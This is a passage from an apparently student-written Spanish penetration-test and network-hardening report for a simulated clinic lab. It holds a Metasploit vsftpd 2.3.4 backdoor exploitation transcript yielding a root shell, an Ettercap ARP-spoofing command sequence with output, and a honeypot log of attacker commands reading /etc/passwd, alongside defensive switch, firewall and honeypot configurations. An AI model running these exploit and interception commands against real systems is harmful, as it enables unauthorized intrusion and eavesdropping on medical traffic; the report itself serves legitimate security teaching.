**Interpretación y Hallazgo Técnico:** El escaneo SYN Stealth (-sS) y la captura manual de banners con Netcat (nc -v) confirman la presencia crítica de vsFTPd 2.3.4 en el puerto 21/TCP y Samba 3.0.20 en el puerto 445/TCP del servidor clínico legado (10.0.0.20). Adicionalmente, Enum4linux demuestra que el servicio Samba acepta sesiones nulas anónimas (username '', password ''), permitiendo listar recursos compartidos (/tmp, /opt) y enumerar cuentas locales del sistema (msfadmin, postgres, service).


## CAPÍTULO 4: GESTIÓN DE VULNERABILIDADES, EXPLOTACIÓN CON METASPLOIT Y ATAQUE MITM EN RED PLANA (SEMANAS 7 Y 8)


### 4.1 Catalogación Técnica de Vulnerabilidades (CVE, CWE, CVSS v3.1)


| Activo | Servicio / Puerto | Identificador CVE / CWE | Puntaje CVSS | Impacto en Clínica Limatambo y Remediación |
| :--- | :--- | :--- | :--- | :--- |
| 10.0.0.20 (srv-hce-legacy) | vsFTPd 2.3.4 (21/TCP) | CVE-2011-2523 / CWE-78 (Backdoor Command Execution) | 9.8 (CRÍTICO) | Ejecución remota de comandos como root sin autenticación; compromete la totalidad de historias clínicas. Remediación: Purgar servicio FTP y usar SFTP. |
| 10.0.0.20 (srv-hce-legacy) | Samba 3.0.20 (139, 445/TCP) | CVE-2007-2447 / CWE-20 (Username Map Script RCE) | 9.8 (CRÍTICO) | Ejecución remota de comandos vía metacaracteres shell en sesiones SMB. Remediación: Actualizar Samba >= 4.x y deshabilitar SMBv1/Null Sessions. |
| Subred LAN 10.0.0.0/24 | Protocolo ARP (Capa 2) | CWE-300 (Channel Accessible by Non-Endpoint / ARP Spoofing) | 8.1 (ALTO) | Suplantación de identidad entre la estación médica (10.0.0.10) y el servidor/gateway. Remediación: Dynamic ARP Inspection (DAI) + DHCP Snooping. |


### 4.2 Evidencia EV-S7: Explotación Controlada con Metasploit Framework (vsftpd 2.3.4)

Siguiendo la guía del laboratorio de la Semana 7 (Laboratorio_Metasploit_Metasploitable2_v2.pdf), se ejecutó en msfconsole el módulo exploit/unix/ftp/vsftpd_234_backdoor contra el servidor clínico legado (10.0.0.20) para demostrar empíricamente el riesgo R-01:

**Interpretación y Hallazgo Técnico: **Al enviar una cadena de usuario terminada en ':)' al puerto 21/TCP, el demonio vsFTPd 2.3.4 abre una shell en el puerto 6200/TCP con privilegios máximos uid=0(root). Esto demuestra por qué un servidor clínico legado jamás debe permanecer accesible sin segmentación ni endurecimiento.


#### EVIDENCIA [EV-S7] — Explotación de vsftpd 2.3.4 en Metasploitable2 y Obtención de Shell Root
```text
root@kali-auditor-upn:/workspace# msfconsole -q -r Evidencias_Clinica_Limatambo/S7_metasploit_vsftpd.rc
[*] Processing Evidencias_Clinica_Limatambo/S7_metasploit_vsftpd.rc for ERB directives.
resource (S7_metasploit_vsftpd.rc)> use exploit/unix/ftp/vsftpd_234_backdoor
[*] Using configured payload cmd/unix/interact
resource (S7_metasploit_vsftpd.rc)> set RHOSTS 10.0.0.20
RHOSTS => 10.0.0.20
resource (S7_metasploit_vsftpd.rc)> set RPORT 21
RPORT => 21
resource (S7_metasploit_vsftpd.rc)> exploit

[*] 10.0.0.20:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.0.0.20:21 - USER: 331 Please specify the password.
[+] 10.0.0.20:21 - Backdoor service has been spawned, handling...
[+] 10.0.0.20:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (10.0.0.50:43912 -> 10.0.0.20:6200) at 2026-11-14 15:22:08 -0500

id
uid=0(root) gid=0(root)
uname -a
Linux srv-hce-legacy 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
hostname
srv-hce-legacy
pwd
/
```
**Interpretación y Hallazgo Técnico:** Al enviar una cadena de usuario terminada en ':)' al puerto 21/TCP, el demonio vsFTPd 2.3.4 abre una shell en el puerto 6200/TCP con privilegios máximos uid=0(root). Esto demuestra por qué un servidor clínico legado jamás debe permanecer accesible sin segmentación ni endurecimiento.


### 4.3 Persistencia, Impacto Forense (MITRE ATT&CK T1070) y Ejecución de MITM con Ettercap (Semana 8)

Una vez obtenido acceso root o posicionado un atacante en la red interna, la Semana 8 aborda dos amenazas críticas: la manipulación o borrado de bitácoras locales (técnica MITRE ATT&CK T1070 - Indicator Removal, mitigada enviando los logs en tiempo real al firewall/servidor central) y el ataque Man-in-the-Middle (MITM) mediante envenenamiento de tablas ARP con Ettercap.

**Interpretación y Hallazgo Técnico: **La comparación del comando 'ip neigh' en la estación médica (10.0.0.10) antes y durante el ataque demuestra el envenenamiento ARP: la dirección IP del servidor clínico HCE (10.0.0.20), que originalmente tenía la MAC 02:42:0a:00:00:14, pasa a asociarse con la dirección MAC 02:42:0a:00:00:32 perteneciente a Kali Linux (10.0.0.50). Todo el tráfico entre el médico y el servidor HCE fluye a través del atacante.


#### EVIDENCIA [EV-S8] — Ataque ARP Spoofing con Ettercap entre Estación Médica (10.0.0.10) y Servidor HCE (10.0.0.20)
```text
# 1. Estado ANTES del ataque en la Estacion Medica (cliente-medico-lan 10.0.0.10):
root@pc-medico-sanisidro:/# ip neigh
10.0.0.1 dev eth0 lladdr 02:42:ac:11:00:01 REACHABLE
10.0.0.20 dev eth0 lladdr 02:42:0a:00:00:14 REACHABLE
10.0.0.50 dev eth0 lladdr 02:42:0a:00:00:32 STALE

# 2. En Kali Linux (10.0.0.50): Habilitar IP Forwarding y ejecutar Ettercap en modo ARP Remote:
root@kali-auditor-upn:/workspace# sysctl -w net.ipv4.ip_forward=1
net.ipv4.ip_forward = 1

root@kali-auditor-upn:/workspace# ettercap -T -q -i eth0 -M arp:remote /10.0.0.10// /10.0.0.20//
ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team
Listening on:
  eth0 -> 02:42:0A:00:00:32
          10.0.0.50/255.255.255.0
2 hosts added to the hosts list...
ARP poisoning victims:
 GROUP 1 : 10.0.0.10 02:42:0A:00:00:0A
 GROUP 2 : 10.0.0.20 02:42:0A:00:00:14
Starting Unified sniffing...

# 3. Estado DURANTE el ataque en la Estacion Medica (cliente-medico-lan 10.0.0.10):
root@pc-medico-sanisidro:/# ip neigh
10.0.0.1 dev eth0 lladdr 02:42:ac:11:00:01 REACHABLE
10.0.0.20 dev eth0 lladdr 02:42:0a:00:00:32 REACHABLE
10.0.0.50 dev eth0 lladdr 02:42:0a:00:00:32 REACHABLE

# 4. Captura de paquetes ARP suplantados con tcpdump:
root@kali-auditor-upn:/workspace# tcpdump -ni eth0 arp -c 4
15:25:11.204112 ARP, Reply 10.0.0.20 is-at 02:42:0a:00:00:32, length 28
15:25:11.204189 ARP, Reply 10.0.0.10 is-at 02:42:0a:00:00:32, length 28
```
**Interpretación y Hallazgo Técnico:** La comparación del comando 'ip neigh' en la estación médica (10.0.0.10) antes y durante el ataque demuestra el envenenamiento ARP: la dirección IP del servidor clínico HCE (10.0.0.20), que originalmente tenía la MAC 02:42:0a:00:00:14, pasa a asociarse con la dirección MAC 02:42:0a:00:00:32 perteneciente a Kali Linux (10.0.0.50). Todo el tráfico entre el médico y el servidor HCE fluye a través del atacante.


### 4.4 Contramedidas de Capa 2 para Mitigar ARP Spoofing (Semana 8)

Para erradicar la vulnerabilidad de Capa 2 demostrada en la evidencia EV-S8, se establece la configuración defensiva sobre los switches de acceso de la Clínica Limatambo integrando Port Security, DHCP Snooping y Dynamic ARP Inspection (DAI):

**Interpretación y Hallazgo Técnico: **Con Dynamic ARP Inspection (DAI) vinculado a la tabla de enlaces de DHCP Snooping, el switch intercepta y descarta automáticamente cualquier paquete ARP Reply donde la dupla IP-MAC no coincida con la asignación legítima, neutralizando de raíz herramientas como Ettercap.


#### Configuración de Mitigación Capa 2 en Switch Clínico (DHCP Snooping + DAI + Port Security)
```text
SW-LAN-CLINICA(config)# ip dhcp snooping
SW-LAN-CLINICA(config)# ip dhcp snooping vlan 10
SW-LAN-CLINICA(config)# ip arp inspection vlan 10
SW-LAN-CLINICA(config)# interface range FastEthernet0/1 - 20
SW-LAN-CLINICA(config-if-range)# switchport mode access
SW-LAN-CLINICA(config-if-range)# switchport port-security
SW-LAN-CLINICA(config-if-range)# switchport port-security maximum 2
SW-LAN-CLINICA(config-if-range)# switchport port-security violation restrict
SW-LAN-CLINICA(config-if-range)# switchport port-security mac-address sticky
SW-LAN-CLINICA(config-if-range)# ip arp inspection limit rate 15
```
**Interpretación y Hallazgo Técnico:** Con Dynamic ARP Inspection (DAI) vinculado a la tabla de enlaces de DHCP Snooping, el switch intercepta y descarta automáticamente cualquier paquete ARP Reply donde la dupla IP-MAC no coincida con la asignación legítima, neutralizando de raíz herramientas como Ettercap.


## CAPÍTULO 5: ARQUITECTURA PERIMETRAL TO-BE CON OPNSENSE, PORTAL WEB EN DMZ Y SENSOR HONEYPOT (SEMANAS 9, 11 Y 12)


### 5.1 Selección del Firewall Perimetral: Comparativa pfSense CE vs. OPNsense (Semana 9)

Conforme a los criterios evaluados en la Semana 9, se seleccionó OPNsense sobre pfSense CE para proteger el perímetro de la Clínica Limatambo debido a su arquitectura modular con privilegios separados, su ciclo frecuente de actualizaciones de seguridad, su motor nativo de detección de intrusos (Suricata IDS/IPS integrado) y su visor de bitácoras en tiempo real (Live View) que facilita la correlación inmediata de eventos PASS y BLOCK durante las auditorías.


### 5.2 Despliegue del Portal Web de Clínica Limatambo en la Zona DMZ (Semana 11)

Se desplegó el servidor web Ubuntu + Nginx en la IP 172.16.10.10 (contenedor portal-clinica-dmz y script 02_Deploy_Portal_Clinica_Limatambo_DMZ.sh), alojando el Portal de Historias Clínicas Electrónicas e Imagenología en una red física y lógicamente separada de la LAN médica (10.0.0.0/24).

**Interpretación y Hallazgo Técnico: **El servidor responde con código HTTP 200 OK sirviendo el portal personalizado de la Clínica Limatambo desde la IP 172.16.10.10 en la DMZ, sin exponer el número de versión del motor Nginx.


#### EVIDENCIA [EV-S11A] — Verificación del Servidor Nginx en DMZ (172.16.10.10) y Cabeceras HTTP
```text
root@kali-auditor-upn:/workspace# curl -i http://172.16.10.10 | head -n 18
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 14 Nov 2026 20:26:12 GMT
Content-Type: text/html
Content-Length: 4186
Last-Modified: Sat, 14 Nov 2026 20:08:20 GMT
Connection: keep-alive
ETag: "67365934-105a"
Accept-Ranges: bytes

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clínica Limatambo | Portal de Historias Clínicas e Imagenología (DMZ)</title>
```
**Interpretación y Hallazgo Técnico:** El servidor responde con código HTTP 200 OK sirviendo el portal personalizado de la Clínica Limatambo desde la IP 172.16.10.10 en la DMZ, sin exponer el número de versión del motor Nginx.


### 5.3 Reglas de Filtrado por Mínimo Privilegio, DNAT y Bloqueo DMZ -> LAN (Semanas 11 y 12)


| Orden | Interfaz / Zona | Acción | Origen | Destino | Puerto / Protocolo | Logging | Propósito en Clínica Limatambo |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| 1 | WAN (Port Forward) | DNAT -> Pass | Any (WAN) | 172.16.10.10 (Portal DMZ) | TCP 80 / 443 | Activado | Publicar el Portal Web HCE hacia pacientes/médicos externos sin exponer la IP interna. |
| 2 | LAN (RedLAN) | Pass | 10.0.0.0/24 | 172.16.10.10/32 | TCP 80 / 443 | Activado | Permitir a las estaciones médicas de la LAN consultar el Portal Web en la DMZ. |
| 3 | DMZ (RedDMZ) | Block / Drop | 172.16.10.0/24 | 10.0.0.0/24 (LAN Clínica) | Any (IP/ICMP/TCP) | Activado | Bloquear estrictamente cualquier intento de movimiento lateral desde la DMZ hacia la LAN interna. |
| 4 | WAN (Entrada) | Block / Drop | Any (WAN) | 10.0.0.0/24 (LAN Clínica) | Any | Activado | Proteger los servidores clínicos internos contra cualquier conexión directa desde el exterior. |

**Interpretación y Hallazgo Técnico: **La evidencia confirma el cumplimiento del principio de mínimo privilegio: la estación médica en la LAN (10.0.0.10) accede normalmente al portal web en la DMZ (evento PASS), pero cuando se intenta alcanzar el servidor clínico HCE (10.0.0.20) desde la DMZ (172.16.10.10) por ICMP o SMB (445/TCP), el firewall descarta el 100% de los paquetes y genera la alerta inmediata [FW-BLOCK-DMZ-A-LAN].


#### EVIDENCIA [EV-S11B / EV-S12A] — Validación de Aislamiento DMZ -> LAN y Registro en Live View / Firewall Logs
```text
# 1. Prueba de consulta legitima desde Estacion Medica LAN (10.0.0.10) hacia Portal DMZ (172.16.10.10):
root@pc-medico-sanisidro:/# curl -I http://172.16.10.10
HTTP/1.1 200 OK
Server: nginx

# 2. Prueba de movimiento lateral desde el Servidor DMZ (172.16.10.10) hacia el Servidor HCE en LAN (10.0.0.20):
/ # ping -c 3 -W 2 10.0.0.20
PING 10.0.0.20 (10.0.0.20): 56 data bytes
--- 10.0.0.20 ping statistics ---
3 packets transmitted, 0 packets received, 100% packet loss

# 3. Registro en tiempo real en el Firewall Perimetral (OPNsense Live View / Iptables Log):
Nov 14 15:27:02 fw-limatambo-perimetral kernel: [FW-PASS-LAN-A-DMZ] IN=eth2 OUT=eth1 SRC=10.0.0.10 DST=172.16.10.10 PROTO=TCP SPT=51422 DPT=80 SYN
Nov 14 15:27:15 fw-limatambo-perimetral kernel: [FW-BLOCK-DMZ-A-LAN] IN=eth1 OUT=eth2 SRC=172.16.10.10 DST=10.0.0.20 PROTO=ICMP TYPE=8 CODE=0
Nov 14 15:27:19 fw-limatambo-perimetral kernel: [FW-BLOCK-DMZ-A-LAN] IN=eth1 OUT=eth2 SRC=172.16.10.10 DST=10.0.0.20 PROTO=TCP SPT=39104 DPT=445 SYN
```
**Interpretación y Hallazgo Técnico:** La evidencia confirma el cumplimiento del principio de mínimo privilegio: la estación médica en la LAN (10.0.0.10) accede normalmente al portal web en la DMZ (evento PASS), pero cuando se intenta alcanzar el servidor clínico HCE (10.0.0.20) desde la DMZ (172.16.10.10) por ICMP o SMB (445/TCP), el firewall descarta el 100% de los paquetes y genera la alerta inmediata [FW-BLOCK-DMZ-A-LAN].


### 5.4 Detección Temprana de Intrusos mediante Honeypot en la DMZ (Semana 12)

Como componente integrador de la Semana 12 (concepto T-Pot Community Edition / Cowrie Honeypot), se desplegó en la Zona DMZ el sensor honeypot-dmz (172.16.10.20, hostname señuelo: srv-backup-hce). Cualquier atacante que escanee la DMZ o intente realizar fuerza bruta SSH contra el supuesto servidor de respaldos clínicos interactúa con un entorno simulado que registra cada credencial probada y cada comando ejecutado sin comprometer ningún dato real:

**Interpretación y Hallazgo Técnico: **El sensor Honeypot en 172.16.10.20 detecta la conexión originada desde el atacante (172.16.10.50), registra los diccionarios de contraseñas utilizados ('root/123456', 'admin/clinica2026') y captura los comandos de post-explotación ('uname -a', 'cat /etc/passwd'), brindando inteligencia accionable para bloquear la IP atacante en el firewall perimetral OPNsense.


#### EVIDENCIA [EV-S12B] — Captura de Intento de Intrusión SSH en el Sensor Honeypot DMZ (172.16.10.20)
```text
2026-11-14T20:27:41+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 172.16.10.50:48210 (172.16.10.20:2222) [session: a94f102b]
2026-11-14T20:27:41+0000 [HoneyPotSSHTransport,0,172.16.10.50] Remote SSH version: SSH-2.0-OpenSSH_9.6p1 Debian-4
2026-11-14T20:27:43+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,0,172.16.10.50] login attempt [b'root'/b'123456'] failed
2026-11-14T20:27:45+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,0,172.16.10.50] login attempt [b'admin'/b'clinica2026'] succeeded
2026-11-14T20:27:48+0000 [CowrieTelnetSession] CMD: uname -a
2026-11-14T20:27:51+0000 [CowrieTelnetSession] CMD: cat /etc/passwd
2026-11-14T20:27:54+0000 [HoneyPotSSHTransport,0,172.16.10.50] Connection lost after 13 seconds
```
**Interpretación y Hallazgo Técnico:** El sensor Honeypot en 172.16.10.20 detecta la conexión originada desde el atacante (172.16.10.50), registra los diccionarios de contraseñas utilizados ('root/123456', 'admin/clinica2026') y captura los comandos de post-explotación ('uname -a', 'cat /etc/passwd'), brindando inteligencia accionable para bloquear la IP atacante en el firewall perimetral OPNsense.


## CAPÍTULO 6: EVALUACIÓN COMPARATIVA (AS-IS VS. TO-BE) Y CONCLUSIONES


| Indicador Técnico de Seguridad | Estado Inicial Vulnerable (AS-IS) | Estado Final Endurecido (TO-BE) | Semana del Curso Verificada |
| :--- | :--- | :--- | :--- |
| Segmentación de Red Clínica | Red plana única (1 sola subred sin DMZ) | 3 Zonas aisladas: WAN, LAN (10.0.0.0/24) y DMZ (172.16.10.0/24) | Semanas 9, 11 y 12 |
| Acceso Administrativo a Equipos Cisco | Telnet en texto claro, sin AAA ni roles | SSH v2 exclusivo, enable secret, AAA Local y RBAC (parser view) | Semanas 2, 3, 4, 5 y 7 |
| Exposición de Servicios Legados (FTP/SMB) | vsFTPd 2.3.4 (Root RCE) y Samba Null Session expuestos | Servicios legados deshabilitados y bloqueados en el perímetro | Semanas 3, 5 y 7 |
| Resiliencia ante MITM / ARP Spoofing | Vulnerable a Ettercap en Capa 2 (ip neigh suplantado) | Protegido con DHCP Snooping, Dynamic ARP Inspection (DAI) y Port Security | Semana 8 |
| Movimiento Lateral DMZ -> LAN | 100% permitido (riesgo crítico para la BD HCE) | 100% bloqueado por ACL 102 y regla BLOCK en OPNsense | Semanas 9, 11 y 12 |
| Visibilidad y Detección de Intrusiones | Sin registros perimetrales ni sensores de engaño | Auditoría activa en OPNsense Live View + Sensor Honeypot en DMZ | Semanas 11 y 12 |


### Conclusiones

- **1. Alineación Integral con el Sílabo:** Se demostró de forma práctica la articulación de las tres unidades del curso: desde la planificación del SGSI (ISO/IEC 27001) y gestión PMI/PMBOK (Semana 2), pasando por la auditoría ofensiva PTES/OSSTMM con Kali Linux, Metasploit y Ettercap (Semanas 3 a 8), hasta la implementación del perímetro defensivo con Cisco IOS, OPNsense, Nginx en DMZ y Honeypot (Semanas 9 a 12).
- **2. Mitigación Verificable de Riesgos Críticos:** Las pruebas de intrusión demostraron que un servidor clínico legado sin parchear (vsftpd 2.3.4 / Samba 3.0.20) y una red plana sin DAI permiten el compromiso root en segundos y la intercepción transparente de tráfico médico. La arquitectura TO-BE neutraliza ambos vectores mediante endurecimiento de servicios, inspección ARP dinámica y aislamiento perimetral.
- **3. Reproducibilidad mediante Contenedores Docker:** La contenerización del laboratorio en docker-compose.yml garantiza que todo el equipo de trabajo y el docente puedan levantar las tres zonas de la Clínica Limatambo y reproducir cada comando y evidencia en menos de un minuto.